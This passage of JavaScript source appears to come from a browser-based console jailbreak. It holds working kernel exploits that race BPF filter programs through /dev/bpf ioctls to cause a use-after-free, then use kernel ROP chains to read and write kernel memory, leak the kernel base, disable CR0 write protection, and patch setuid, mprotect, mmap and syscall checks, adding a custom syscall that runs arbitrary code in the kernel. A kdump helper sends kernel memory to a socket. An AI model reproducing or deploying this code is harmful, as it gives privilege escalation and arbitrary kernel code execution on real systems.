			push_bpf(bpf, 0x4, val); // BPF_ALU|BPF_ADD|BPF_K
			push_bpf(bpf, 2, offset); // BPF_ST
		}
		
		
		var krop_off = 0x1e;
		var reset_krop = function() {
			krop_off = 0x1e;
			bpf_invalid_u32.i = 16;
		}
		var push_krop = function(value) {
			bpf_write8imm(bpf_invalid_u32, krop_off, value);
			krop_off += 2;
		}
		var push_krop_fromoff = function(value) {
			bpf_copy8(bpf_invalid_u32, krop_off, value);
			krop_off += 2;
		}
		var finalize_krop = function(retv) {
			if (!retv)
				retv = 5;
			push_bpf(bpf_invalid_u32, 6, retv); // return 5
		}
		
		/*
		 fake stack frame
		 */
		reset_krop();
		push_krop(window.gadgets["pop rdi"]);
		push_krop(0); // 8
		push_krop(window.gadgets["pop rdi"]); // 0x10
		push_krop(0); // 0x18
		push_krop(window.gadgets["pop rdi"]); // 0x20
		push_krop(0); // 0x28
		push_krop(window.gadgets["pop rax"]); // 0x30
		push_krop(0); // 0x38
		push_krop(window.gadgets["ret"]); // 0x40
		push_krop(window.gadgets["leave_1"]); // 0x48
		finalize_krop();

		var bpf_valid = p.read8(p.leakval(bpf_valid_u32).add32(window.leakval_slide));
		var bpf_invalid = p.read8(p.leakval(bpf_invalid_u32).add32(window.leakval_slide));

		var bpf_valid_prog = bpfinsnp.add32(0x40);
		var bpf_invalid_prog = bpfinsnp.add32(0x80);
		
		p.write8(bpf_valid_prog, 64);
		p.write8(bpf_invalid_prog, 64);
		p.write8(bpf_valid_prog.add32(8), bpf_valid);
		p.write8(bpf_invalid_prog.add32(8), bpf_invalid);
		
		p.syscall("sys_write", fd, scratch, 40);
		p.syscall("sys_ioctl", fd, 0x8010427B, bpf_valid_prog);
		p.syscall("sys_ioctl", fd, 0x8010427B, bpf_invalid_prog);
		p.syscall("sys_write", fd, scratch, 40);

		var interrupt1 = 0;
		var interrupt2 = 0;
		// ioctl() with valid BPF program -> will trigger reallocation of BFP code alloc
		window.spawnthread(function(thread2){
			interrupt1 = thread2.stackBase;
			thread2.push(window.gadgets["pop rdi"]); // pop rdi
			thread2.push(fd); // what
			thread2.push(window.gadgets["pop rsi"]); // pop rsi
			thread2.push(0x8010427B); // what
			thread2.push(window.gadgets["pop rdx"]); // pop rdx
			thread2.push(bpf_valid_prog); // what
			thread2.push(window.gadgets["pop rsp"]); // pop rdx
			thread2.push(thread2.stackBase.add32(0x800)); // what
			thread2.count = 0x100;
			var cntr = thread2.count;
			thread2.push(window.syscalls[54]); // ioctl
			thread2.push_write8(thread2.stackBase.add32(cntr*8), window.syscalls[54]); // restore ioctl
			thread2.push(window.gadgets["pop rsp"]); // pop rdx
			thread2.push(thread2.stackBase); // what
		});
		
		// ioctl() with invalid BPF program -> this will be executed when triggering bug
		window.spawnthread(function(thread2){
			interrupt2 = thread2.stackBase;
			thread2.push(window.gadgets["pop rdi"]); // pop rdi
			thread2.push(fd); // what
			thread2.push(window.gadgets["pop rsi"]); // pop rsi
			thread2.push(0x8010427B); // what
			thread2.push(window.gadgets["pop rdx"]); // pop rdx
			thread2.push(bpf_invalid_prog); // what
			thread2.push(window.gadgets["pop rsp"]); // pop rdx
			thread2.push(thread2.stackBase.add32(0x800)); // what
			thread2.count = 0x100;
			var cntr = thread2.count;
			thread2.push(window.syscalls[54]); // ioctl
			thread2.push_write8(thread2.stackBase.add32(cntr*8), window.syscalls[54]); // restore ioctl
			thread2.push(window.gadgets["pop rsp"]); // pop rdx
			thread2.push(thread2.stackBase); // what
		});

		bpfinsn[0] = 0;

		var kern_write8 = function(addr, val) {
			reset_krop();
			push_krop(window.gadgets["pop rdi"]);
			push_krop(addr); // 8
			push_krop(window.gadgets["pop rsi"]); // 0x10
			push_krop(val); // 0x18
			push_krop(window.gadgets["mov [rdi], rsi"]); // 0x20
			
			push_krop(window.gadgets["ret"]); // 0x28
			push_krop(window.gadgets["pop rax"]); // 0x30
			push_krop(0); // 0x38
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
		};
		
		var kern_read8 = function(addr) {
			reset_krop();
			push_krop(window.gadgets["pop rdi"]);
			push_krop(addr); // 8
			push_krop(window.gadgets["mov rax, [rdi]"]); // 0x10
			push_krop(window.gadgets["pop rdi"]); // 0x18
			push_krop(bpfinsnp); // 0x20
			push_krop(window.gadgets["mov [rdi], rax"]); // 0x28
			
			push_krop(window.gadgets["pop rax"]); // 0x30
			push_krop(0); // 0x38
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
			return p.read8(bpfinsnp);
		};
		
		var readable_kern_read8 = function(addr) {
			reset_krop();
			push_krop(window.gadgets["pop rdi"]);
			push_krop(addr); // 8
			push_krop(window.gadgets["mov rax, [rdi]"]); // 0x10
			push_krop(window.gadgets["pop rdi"]); // 0x18
			push_krop(bpfinsnp); // 0x20
			push_krop(window.gadgets["mov [rdi], rax"]); // 0x28
			
			push_krop(window.gadgets["pop rax"]); // 0x30
			push_krop(0); // 0x38
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
			return p.readable_read8(bpfinsnp);
		}
		
		var kern_memcpy = function(dst, src, size) {
			reset_krop();
			push_krop(window.gadgets["pop rdi"]);
			push_krop(dst); // 8
			push_krop(window.gadgets["pop rsi"]); // 0x10
			push_krop(src); // 0x18
			push_krop(window.gadgets["pop rdx"]); // 0x20
			push_krop(size); // 0x28
			push_krop(window.gadgets["memcpy"]); // 0x30
			push_krop(window.gadgets["mov [rdi], rax"]); // 0x38
			
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
		};

		var kern_leak_rip = function() {
			reset_krop();
			bpf_copy8(bpf_invalid_u32, 0, 0x1e);
			push_krop(window.gadgets["pop rdi"]);
			push_krop(bpfinsnp); // 8
			push_krop(window.gadgets["pop rsi"]); // 0x10
			push_krop_fromoff(0); // 0x18
			push_krop(window.gadgets["mov [rdi], rsi"]); // 0x20
			
			push_krop(window.gadgets["ret"]); // 0x28
			push_krop(window.gadgets["pop rax"]); // 0x30
			push_krop(0); // 0x38
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
			return p.read8(bpfinsnp);
		}
		
		var kernelBase = kern_leak_rip().sub32(window.kernel_offsets["bpf_slide"])
		//if (readable_kern_read8(kernelBase) != "7f454c4602010109")
		//	alert("Not found kernel base! 0x" + kernelBase);
		
		var kdump = function(address, size) {
			var s = p.socket();
			//alert("After pressing OK, please launch socket listen.");
			p.connectSocket(s, socket_ip_pc, socket_port_send);
			//alert("Starting kernel dumping to socket. Accept to continue.");
			var kernelBuf = p.malloc(size);
			kern_memcpy(kernelBuf, address, size);
			p.writeSocket(s, kernelBuf, size);
			p.closeSocket(s);
		};
		
		//kdump(kernelBase, 0x69B8000);
		
		var kern_get_cr0 = function() {
			reset_krop();
			push_krop(kernelBase.add32(window.kernel_offsets["cpu_setregs"]));
			push_krop(window.gadgets["ret"]); // 8
			push_krop(window.gadgets["pop rdi"]); // 0x10
			push_krop(bpfinsnp); // 0x16
			push_krop(window.gadgets["mov [rdi], rax"]); // 0x20
			
			push_krop(window.gadgets["ret"]); // 0x28
			push_krop(window.gadgets["pop rax"]); // 0x30
			push_krop(0); // 0x38
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
			return p.read4(bpfinsnp);
		};

		var kern_set_cr0_write = function(cr0, addr, val) {
			reset_krop();
			push_krop(kernelBase.add32(window.kernel_offsets["mov cr0, rax"])); // 0x18
			push_krop(window.gadgets["pop rdi"]); // 0x20
			push_krop(addr); // 0x28
			push_krop(window.gadgets["pop rsi"]); // 0x30
			push_krop(val); // 0x38
			push_krop(window.gadgets["mov [rdi], rsi"]); // 0x20
			push_krop(kernelBase.add32(window.kernel_offsets["cpu_setregs"])); // 0x18
			
			push_krop(window.gadgets["pop rax"]); // 0x40
			push_krop(0); // 0x10
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop(cr0);
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
		};
		
		var kern_jump_cr0 = function(addr, cr0, rdi, rsi) {
			reset_krop();
			push_krop(kernelBase.add32(window.kernel_offsets["mov cr0, rax"])); // 0x18
			push_krop(window.gadgets["pop rdi"]); // 0x20
			push_krop(rdi); // 0x28
			push_krop(window.gadgets["pop rsi"]); // 0x30
			push_krop(rsi); // 0x38
			push_krop(addr); // 0x20
			push_krop(kernelBase.add32(window.kernel_offsets["cpu_setregs"])); // 0x18
			
			push_krop(window.gadgets["pop rax"]); // 0x40
			push_krop(0); // 0x10
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop(cr0);
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
		};
		
		
		var cr0 = kern_get_cr0();
		cr0 &= ((~(1 << 16)) >>> 0);
		
		window.log("Applying kernel patches...");
		
		// Helper function for patching kernel
		var kpatch = function(dest_offset, patch_data_qword) {
			kern_set_cr0_write(cr0, kernelBase.add32(dest_offset), patch_data_qword);
		}
		
		// Helper function for patching kernel with information from kernel.text
		var kpatch2 = function(dest_offset, src_offset) {
			kern_set_cr0_write(cr0, kernelBase.add32(dest_offset), kernelBase.add32(src_offset));
		}
		

		// Add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
		kpatch(window.kernel_offsets["sys_setuid_patch_offset"], new int64(window.kernel_patches["sys_setuid_patch_1"], window.kernel_patches["sys_setuid_patch_2"]));
		
		// Patch mprotect: Allow RWX (read-write-execute) mapping
		kpatch(window.kernel_offsets["vm_map_protect_patch_offset"], new int64(window.kernel_patches["vm_map_protect_patch_1"], window.kernel_patches["vm_map_protect_patch_2"]));
		
		// Patch sys_mmap: Allow RWX (read-write-execute) mapping
		kpatch(window.kernel_offsets["sys_mmap_patch_offset"], new int64(window.kernel_patches["sys_mmap_patch_1"], window.kernel_patches["sys_mmap_patch_2"]));
		
		// Patch syscall: syscall instruction allowed anywhere
		//kpatch(window.kernel_offsets["amd64_syscall_patch1_offset"], new int64(window.kernel_patches["amd64_syscall_patch1_1"], window.kernel_patches["amd64_syscall_patch1_2"]));
		kpatch(window.kernel_offsets["amd64_syscall_patch2_offset"], new int64(window.kernel_patches["amd64_syscall_patch2_1"], window.kernel_patches["amd64_syscall_patch2_2"]));
		/*
		// Patch sys_dynlib_dlsym: Allow from anywhere
		kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch1_offset"], new int64(window.kernel_patches["sys_dynlib_dlsym_patch1_1"], window.kernel_patches["sys_dynlib_dlsym_patch1_2"]));
		kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch2_offset"], new int64(window.kernel_patches["sys_dynlib_dlsym_patch2_1"], window.kernel_patches["sys_dynlib_dlsym_patch2_2"]));
		*/
		// Add custom sys_exec() call to execute arbitrary code as kernel
		kpatch(window.kernel_offsets["syscall_11_patch1_offset"], 2);
		kpatch2(window.kernel_offsets["syscall_11_patch2_offset"], window.kernel_offsets["jmp [rsi]"]);
		kpatch(window.kernel_offsets["syscall_11_patch3_offset"], new int64(0, 1));
		
	} catch(ex) {
		fail(ex);
		return false;
	}
	
	// failed (should never go here)
	return false;
}

//================================================================================================
// Kernel Exploit: BPF Race
//================================================================================================
function kernExploit_bpf_race() {
	try {
		window.log("Starting BPF UAF kexploit...");
		
		function kernel_rop_run(fd, scratch) {
			while (1) { // wait for it
				var ret = p.syscall("sys_write", fd, scratch, 40);
				if (ret.low == 40)
					break;
			}
			return ret;
		}
		
		// Setup kchain stack for kernel ROP chain
		var kchainstack = p.malloc(0x1000);
		var kchain = new window.kropchain(kchainstack);
		var savectx = p.malloc(0x200);
		
		/////////////////// STAGE 1: Setting Up BPF Programs ///////////////////

		var spadp = p.malloc32(0x2000);

		// Open first device and bind
		var fd1 = p.syscall("sys_open", p.stringify("/dev/bpf"), 2, 0); // 0666 permissions, open as O_RDWR
		if (fd1 < 0)
			throw "Failed to open first /dev/bpf device!";
		p.syscall("sys_ioctl", fd1, 0x8020426C, p.stringify("eth0")); // 8020426C = BIOCSETIF
		if (p.syscall("sys_write", fd1, spadp, 40).low == (-1 >>> 0)) {
			p.syscall("sys_ioctl", fd1, 0x8020426C, p.stringify("wlan0"));
			if (p.syscall("sys_write", fd1, spadp, 40).low == (-1 >>> 0))
				throw "Failed to bind to first /dev/bpf device!";
		}

		// Open second device and bind
		var fd2 = p.syscall("sys_open", p.stringify("/dev/bpf"), 2, 0); // 0666 permissions, open as O_RDWR
		if (fd2 < 0)
			throw "Failed to open second /dev/bpf device!";
		p.syscall("sys_ioctl", fd2, 0x8020426C, p.stringify("eth0")); // 8020426C = BIOCSETIF
		if (p.syscall("sys_write", fd2, spadp, 40).low == (-1 >>> 0)) {
			p.syscall("sys_ioctl", fd2, 0x8020426C, p.stringify("wlan0"));
			if (p.syscall("sys_write", fd2, spadp, 40).low == (-1 >>> 0))
				throw "Failed to bind to second /dev/bpf device!";
		}
		
		// Setup valid program
		var bpf_valid_prog = p.malloc(0x10);
		var bpf_valid_instructions = p.malloc(0x80);

		p.write8(bpf_valid_instructions.add32(0x00), 0x00000000); // By specifying 0's for the args it effectively does nothing
		p.write8(bpf_valid_instructions.add32(0x08), 0x00000000);
		p.write8(bpf_valid_instructions.add32(0x10), 0x00000000);
		p.write8(bpf_valid_instructions.add32(0x18), 0x00000000);
		p.write8(bpf_valid_instructions.add32(0x20), 0x00000000);
		p.write8(bpf_valid_instructions.add32(0x28), 0x00000000);
		p.write8(bpf_valid_instructions.add32(0x30), 0x00000000);
		p.write8(bpf_valid_instructions.add32(0x38), 0x00000000);
		p.write4(bpf_valid_instructions.add32(0x40), 0x00000006); // BPF_RET
		p.write4(bpf_valid_instructions.add32(0x44), 0x00000000); // 0

		p.write8(bpf_valid_prog.add32(0x00), 0x00000009);
		p.write8(bpf_valid_prog.add32(0x08), bpf_valid_instructions);

		// Setup invalid program
		var entry = window.gadgets["pop rsp"];
		var bpf_invalid_prog = p.malloc(0x10);
		var bpf_invalid_instructions = p.malloc(0x80);

		p.write4(bpf_invalid_instructions.add32(0x00), 0x00000001); // BPF_LDX
		p.write4(bpf_invalid_instructions.add32(0x04), entry.low); // {lower 32-bits of stack pivot gadget address (pop rsp)}
		p.write4(bpf_invalid_instructions.add32(0x08), 0x00000003); // BPF_STX
		p.write4(bpf_invalid_instructions.add32(0x0C), 0x0000001E); // 0x1E
		p.write4(bpf_invalid_instructions.add32(0x10), 0x00000001); // BPF_LDX
		p.write4(bpf_invalid_instructions.add32(0x14), entry.hi); // {upper 32-bits of stack pivot gadget address (pop rsp)}
		p.write4(bpf_invalid_instructions.add32(0x18), 0x00000003); // BPF_STX
		p.write4(bpf_invalid_instructions.add32(0x1C), 0x0000001F); // 0x1F
		p.write4(bpf_invalid_instructions.add32(0x20), 0x00000001); // BPF_LDX
		p.write4(bpf_invalid_instructions.add32(0x24), kchainstack.low); // {lower 32-bits of kernel ROP chain fake stack address}
		p.write4(bpf_invalid_instructions.add32(0x28), 0x00000003); // BPF_STX
		p.write4(bpf_invalid_instructions.add32(0x2C), 0x00000020); // 0x20
		p.write4(bpf_invalid_instructions.add32(0x30), 0x00000001); // BPF_LDX
		p.write4(bpf_invalid_instructions.add32(0x34), kchainstack.hi); // {upper 32-bits of kernel ROP chain fake stack address}
		p.write4(bpf_invalid_instructions.add32(0x38), 0x00000003); // BPF_STX
		p.write4(bpf_invalid_instructions.add32(0x3C), 0x00000021); // 0x21
		p.write4(bpf_invalid_instructions.add32(0x40), 0x00000006); // BPF_RET
		p.write4(bpf_invalid_instructions.add32(0x44), 0x00000001); // 1

		p.write8(bpf_invalid_prog.add32(0x00), 0x00000009);
		p.write8(bpf_invalid_prog.add32(0x08), bpf_invalid_instructions);
		
		/////////////////// STAGE 2: Building Kernel ROP Chain ///////////////////
		
		// Helper function for patching kernel
		var kpatch = function(dest_offset, patch_data_qword) {
			kchain.push(window.gadgets["pop rax"]);
			kchain.push(dest_offset);
			kchain.push(window.gadgets["pop rdi"]);
			kchain.push(savectx.add32(0x50));			
			kchain.push(window.gadgets["add rax, [rdi]"]);
			kchain.push(window.gadgets["mov rdx, rax"]);
			kchain.push(window.gadgets["pop rax"]);
			kchain.push(patch_data_qword);
			kchain.push(window.gadgets["mov [rdx], rax"]);
		}
		
		// Helper function for patching kernel with information from kernel.text
		var kpatch2 = function(dest_offset, src_offset) {
			kchain.push(window.gadgets["pop rax"]);
			kchain.push(savectx.add32(0x50));
			kchain.push(window.gadgets["mov rax, [rax]"]);
			kchain.push(window.gadgets["pop rcx"]);
			kchain.push(dest_offset);
			kchain.push(window.gadgets["add rax, rcx"]);
			kchain.push(window.gadgets["mov rdx, rax"]);
			kchain.push(window.gadgets["pop rax"]);
			kchain.push(savectx.add32(0x50));
			kchain.push(window.gadgets["mov rax, [rax]"]);
			kchain.push(window.gadgets["pop rcx"]);
			kchain.push(src_offset);
			kchain.push(window.gadgets["add rax, rcx"]);
			kchain.push(window.gadgets["mov [rdx], rax"]);
		}
		
		// NOP Sled
		kchain.push(window.gadgets["ret"]);
		kchain.push(window.gadgets["ret"]);
		kchain.push(window.gadgets["ret"]);
		kchain.push(window.gadgets["ret"]);
		kchain.push(window.gadgets["ret"]);
		kchain.push(window.gadgets["ret"]);
		//kchain.push(window.gadgets["ret"]);
		//kchain.push(window.gadgets["ret"]);
		
		//kchain.push(window.gadgets["infloop"]);
		
		// Save context to exit back to userland when finished
		kchain.push(window.gadgets["pop rdi"]);
		kchain.push(savectx);
		//kchain.push(window.o2lc(0x1D3C)); // 4.55
		//kchain.push(window.o2lc(0x509C)); // 4.05
		kchain.push(window.gadgets["ret"]);
		kchain.push(window.o2wk(0x3E02)); // 3.55
		
		/*
		CODE:000000000000509C                 mov     rcx, rdi
		CODE:000000000000509F                 mov     rdx, [rsp+0]
		CODE:00000000000050A3                 mov     [rcx], rdx
		CODE:00000000000050A6                 mov     [rcx+8], rbx
		CODE:00000000000050AA                 mov     [rcx+10h], rsp
		CODE:00000000000050AE                 mov     [rcx+18h], rbp
		CODE:00000000000050B2                 mov     [rcx+20h], r12
		CODE:00000000000050B6                 mov     [rcx+28h], r13
		CODE:00000000000050BA                 mov     [rcx+30h], r14
		CODE:00000000000050BE                 mov     [rcx+38h], r15
		CODE:00000000000050C2                 fnstcw  word ptr [rcx+40h]
		CODE:00000000000050C5                 stmxcsr dword ptr [rcx+44h]
		CODE:00000000000050C9                 xor     rax, rax
		CODE:00000000000050CC                 retn
		*/
		
		/*
		// Defeat kASLR (resolve kernel .text base)
		var kernel_slide = new int64(-window.kernel_offsets["__stack_chk_guard"], -1);
		kchain.push(window.gadgets["pop rax"]);
		kchain.push(savectx.add32(0x30));
		kchain.push(window.gadgets["mov rax, [rax]"]);
		kchain.push(window.gadgets["pop rcx"]);
		kchain.push(kernel_slide);
		kchain.push(window.gadgets["add rax, rcx"]);
		kchain.push(window.gadgets["pop rdi"]);
		kchain.push(savectx.add32(0x50));
		kchain.push(window.gadgets["mov [rdi], rax"]);
		
		// Disable kernel write protection
		kchain.push(window.gadgets["pop rax"]);
		kchain.push(savectx.add32(0x50));
		kchain.push(window.gadgets["mov rax, [rax]"]);
		kchain.push(window.gadgets["pop rcx"]);
		kchain.push(window.kernel_offsets["mov cr0, rax"]);
		kchain.push(window.gadgets["add rax, rcx"]);
		kchain.push(window.gadgets["mov rdx, rax"]);
		kchain.push(window.gadgets["pop rax"]);
		kchain.push(0x80040033);
		kchain.push(window.gadgets["jmp rdx"]);
		*/
		
		/*
		// Add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
		kpatch(window.kernel_offsets["sys_setuid_patch_offset"], new int64(window.kernel_patches["sys_setuid_patch_1"], window.kernel_patches["sys_setuid_patch_2"]));
		
		// Patch mprotect: Allow RWX (read-write-execute) mapping
		kpatch(window.kernel_offsets["vm_map_protect_patch_offset"], new int64(window.kernel_patches["vm_map_protect_patch_1"], window.kernel_patches["vm_map_protect_patch_2"]));
		
		// Patch sys_mmap: Allow RWX (read-write-execute) mapping
		kpatch(window.kernel_offsets["sys_mmap_patch_offset"], new int64(window.kernel_patches["sys_mmap_patch_1"], window.kernel_patches["sys_mmap_patch_2"]));
		
		// Patch syscall: syscall instruction allowed anywhere
		kpatch(window.kernel_offsets["amd64_syscall_patch1_offset"], new int64(window.kernel_patches["amd64_syscall_patch1_1"], window.kernel_patches["amd64_syscall_patch1_2"]));
		kpatch(window.kernel_offsets["amd64_syscall_patch2_offset"], new int64(window.kernel_patches["amd64_syscall_patch2_1"], window.kernel_patches["amd64_syscall_patch2_2"]));
		
		// Patch sys_dynlib_dlsym: Allow from anywhere
		kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch1_offset"], new int64(window.kernel_patches["sys_dynlib_dlsym_patch1_1"], window.kernel_patches["sys_dynlib_dlsym_patch1_2"]));
		kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch2_offset"], new int64(window.kernel_patches["sys_dynlib_dlsym_patch2_1"], window.kernel_patches["sys_dynlib_dlsym_patch2_2"]));
		
		// Add custom sys_exec() call to execute arbitrary code as kernel
		kpatch(window.kernel_offsets["syscall_11_patch1_offset"], 2);
		kpatch2(window.kernel_offsets["syscall_11_patch2_offset"], window.kernel_offsets["jmp [rsi]"]);
		kpatch(window.kernel_offsets["syscall_11_patch3_offset"], new int64(0, 1));
		
		// Enable kernel write protection
		kchain.push(window.gadgets["pop rax"]);
		kchain.push(savectx.add32(0x50));
		kchain.push(window.gadgets["mov rax, [rax]"]);
		kchain.push(window.gadgets["pop rcx"]);
		kchain.push(window.kernel_offsets["cpu_setregs"]);
		kchain.push(window.gadgets["add rax, rcx"]);
		kchain.push(window.gadgets["jmp rax"])
		*/
		
		// To userland!
		/*kchain.push(window.gadgets["pop rax"]);
		kchain.push(0);
		kchain.push(window.gadgets["ret"]);
		kchain.push(window.gadgets["leave"]);*/

		/////////////////// STAGE 3: Racing Filters ///////////////////
		
//alert("before spawnthread");
		// ioctl with valid BPF program will trigger free() of old program and reallocate memory for the new one
		// sys_ioctl(fd1, BIOCSETWF, bpf_valid_prog);
		window.spawnthread(function (thread2) {
			//thread2.push(window.gadgets["ret"]);
			//thread2.push(window.gadgets["ret"]);
			//thread2.push(window.gadgets["ret"]);
			thread2.push(window.gadgets["pop rdi"]); // pop rdi
			thread2.push(fd1); // what
			thread2.push(window.gadgets["pop rsi"]); // pop rsi
			thread2.push(0x8010427B); // 0x8010427B = BIOCSETWF
			thread2.push(window.gadgets["pop rdx"]); // pop rdx
			thread2.push(bpf_valid_prog); // what
			thread2.push(window.gadgets["pop rsp"]); // pop rsp
			thread2.push(thread2.stackBase.add32(0x800)); // what
			thread2.count = 0x100;
			var cntr = thread2.count;
			thread2.push(window.syscalls[54]); // sys_ioctl
			thread2.push_write8(thread2.stackBase.add32(cntr * 8), window.syscalls[54]); // restore sys_ioctl
			thread2.push(window.gadgets["pop rsp"]); // pop rdx
			thread2.push(thread2.stackBase); // what
		});
		
		// ioctl() with invalid BPF program will be sprayed and eventually get used by the thread where the program has already been validated
		// sys_ioctl(fd2, BIOCSETWF, bpf_invalid_prog);
		window.spawnthread(function (thread2) {
			//thread2.push(window.gadgets["ret"]);
			//thread2.push(window.gadgets["ret"]);
			//thread2.push(window.gadgets["ret"]);
			thread2.push(window.gadgets["pop rdi"]); // pop rdi
			thread2.push(fd2); // what
			thread2.push(window.gadgets["pop rsi"]); // pop rsi
			thread2.push(0x8010427B); // 0x8010427B = BIOCSETWF
			thread2.push(window.gadgets["pop rdx"]); // pop rdx
			thread2.push(bpf_invalid_prog); // what
			thread2.push(window.gadgets["pop rsp"]); // pop rsp
			thread2.push(thread2.stackBase.add32(0x800)); // what - jumps to thread2 at offset 0x800
			thread2.count = 0x100; // set the instructions counter to 0x100 because each instruction is of size 8 and 0x100*8=0x800
			var cntr = thread2.count;
			thread2.push(window.syscalls[54]); // sys_ioctl
			thread2.push_write8(thread2.stackBase.add32(cntr * 8), window.syscalls[54]); // restore sys_ioctl
			thread2.push(window.gadgets["pop rsp"]); // pop rdx
			thread2.push(thread2.stackBase); // what
		});
//alert("before krop run");

		/////////////////// STAGE 3: Trigger ///////////////////
		
		var scratch = p.malloc(40);
		var test = kernel_rop_run(fd1, scratch);
//alert("after krop run");
		if (p.syscall("sys_setuid", 0) == 0)
			return true;
		else
			throw "Kernel exploit failed!";
		return false;
		
	} catch(ex) {
		fail(ex);
		return false;
	}
	
	// failed (should never go here)
	return false;
}

//================================================================================================
// Kernel
//================================================================================================
function kernExploit() {
	try {
		var fd = p.syscall("sys_open", p.stringify("/dev/bpf0"), 2).low;
		if (fd == (-1 >>> 0))
			throw "Failed to open first bpf device!"
		var fd1 = p.syscall("sys_open", p.stringify("/dev/bpf0"), 2).low;
		
		// Write BPF programs
		var bpf_valid = p.malloc32(0x4000);
		var bpf_spray = p.malloc32(0x4000);
		var bpf_valid_u32 = bpf_valid.backing;
		
		var bpf_valid_prog = p.malloc(0x40);
		p.write8(bpf_valid_prog, 0x800 / 8)
		p.write8(bpf_valid_prog.add32(8), bpf_valid)
		
		var bpf_spray_prog = p.malloc(0x40);
		p.write8(bpf_spray_prog, 0x800 / 8)
		p.write8(bpf_spray_prog.add32(8), bpf_spray)
		
		for (var i = 0; i < 0x400;) {
			bpf_valid_u32[i++] = 6;
			bpf_valid_u32[i++] = 0;
		}
		
		var rtv = p.syscall("sys_ioctl", fd, 0x8010427B, bpf_valid_prog);
		if (rtv.low != 0)
			throw "Failed to open first bpf device!";
		
		// Spawn thread
		var spawnthread = function (name, chain) {
			var contextp = p.malloc32(0x2000);
			var contextz = contextp.backing;
			contextz[0] = 1337;
			var thread2 = new rop();
			thread2.push(window.gadgets["ret"]);
			thread2.push(window.gadgets["ret"]);
			thread2.push(window.gadgets["ret"]);
			thread2.push(window.gadgets["ret"]);
			chain(thread2);
			p.write8(contextp, window.gadgets["ret"]);
			p.write8(contextp.add32(0x10), thread2.stackBase);
			p.syscall(324, 1);
			var retv = function () { p.fcall(window.gadgets["createThread"], window.gadgets["longjmp"], contextp, p.stringify(name)); }
			window.nogc.push(contextp);
			window.nogc.push(thread2);
			return retv;
		}
		
		var interrupt1, loop1;
		var interrupt2, loop2;
		var sock = p.syscall(97, 2, 2);
		
		// Racing thread
		var start1 = spawnthread("GottaGoFast", function (thread2) {
			interrupt1 = thread2.stackBase;
			thread2.push(window.gadgets["ret"]);
			thread2.push(window.gadgets["ret"]);
			thread2.push(window.gadgets["ret"]);
			
			thread2.push(window.gadgets["pop rdi"]);
			thread2.push(fd);
			thread2.push(window.gadgets["pop rsi"]);
			thread2.push(0x8010427B);
			thread2.push(window.gadgets["pop rdx"]);
			thread2.push(bpf_valid_prog);
			thread2.push(window.gadgets["pop rsp"]);
			thread2.push(thread2.stackBase.add32(0x800));
			thread2.count = 0x100;
			var cntr = thread2.count;
			thread2.push(window.syscalls[54]); // ioctl
			thread2.push_write8(thread2.stackBase.add32(cntr * 8), window.syscalls[54]); // restore ioctl
			
			thread2.push(window.gadgets["pop rdi"]);
			var wherep = thread2.pushSymbolic();
			thread2.push(window.gadgets["pop rsi"]);
			var whatp = thread2.pushSymbolic();
			thread2.push(window.gadgets["mov [rdi], rsi"]);
			
			thread2.push(window.gadgets["pop rsp"]);
			
			loop1 = thread2.stackBase.add32(thread2.count * 8);
			thread2.push(0x41414141);
			
			thread2.finalizeSymbolic(wherep, loop1);
			thread2.finalizeSymbolic(whatp, loop1.sub32(8));
		});
		
		// start setting up chains
		var krop = new rop();
		
		var kscratch = p.malloc32(0x1000);
		var ctxp  = p.malloc32(0x1000);
		var ctxp1 = p.malloc32(0x1000);
		var ctxp2 = p.malloc32(0x1000);
		
		
		// Helper function for patching kernel
		var kpatch = function(offset, qword) {
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(offset);
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(qword);
			krop.push(window.gadgets["mov [rax], rsi"]);
		}
		
		// Helper function for patching kernel with information from kernel.text
		var kpatch2 = function(offset, offset2) {
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(offset);
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["mov rdi, rax"]);
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rsi"]);
			krop.push(offset2);
			krop.push(window.gadgets["add rax, rsi"]);
			krop.push(window.gadgets["mov [rdi], rax"]);
		}
		
		var stackshift_from_retaddr = 0;
		
